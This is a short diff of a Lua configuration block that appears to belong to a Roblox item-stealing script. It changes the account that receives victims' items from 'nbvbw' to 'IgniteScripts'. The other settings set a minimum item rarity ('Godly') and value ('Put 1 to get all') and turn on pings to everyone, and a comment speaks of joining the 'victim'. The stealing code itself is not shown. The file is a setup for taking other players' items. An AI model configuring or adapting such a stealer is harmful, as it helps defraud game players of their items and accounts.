@@ -1,4 +1,4 @@
-_G.Username = "nbvbw" -- user you should join victim on
+_G.Username = "IgniteScripts" -- user you should join victim on
 _G.min_rarity = "Godly"
 _G.min_value = 1 -- Put 1 to get all
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
